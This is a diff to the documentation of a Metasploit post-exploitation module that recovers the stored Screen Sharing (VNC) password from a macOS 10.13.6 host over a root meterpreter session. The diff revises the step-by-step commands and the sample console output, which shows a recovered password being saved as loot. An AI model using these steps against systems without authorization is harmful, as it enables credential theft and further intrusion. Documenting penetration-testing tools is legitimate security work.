@@ -5,7 +5,7 @@ System Preferences > Sharing > Screen Sharing > Computer Settings
 
 ## Vulnerable Application
 
-  * macOS 10.13.6*
+  * macOS 10.13.6
 
 
 ## Verification Steps
@@ -13,10 +13,11 @@ System Preferences > Sharing > Screen Sharing > Computer Settings
   Example steps in this format (is also in the PR):
 
   1. Start `msfconsole`
-  2. Do: `post/osx/gather/vnc_password_osx`
-  3. Do: set the `SESSION [ID]`
-  4. Do: ```run```
-  5. You should get the password
+  2. Get an OSX meterpreter session running as root
+  3. Do: `use post/osx/gather/vnc_password_osx`
+  4. Do: `set SESSION [ID]`
+  5. Do: `run`
+  6. You should see the password
 
 
 ## Scenarios
@@ -29,10 +30,9 @@ msf5 post(osx/gather/vnc_password_osx) > set SESSION 1
 SESSION => 1
 msf5 post(osx/gather/vnc_password_osx) > exploit
 
-[*] Running module against MacBook-Pro.local
-[*] This session is running as root!
 [*] Checking VNC Password...
 [+] Password Found: PoCpassw
+[+] Password data stored as loot in: .msf4/loot/20181002142527_default_10.0.2.15_osx.vnc.password_371610.txt
 [*] Post module execution completed
 msf5 post(osx/gather/vnc_password_osx) >
 ```
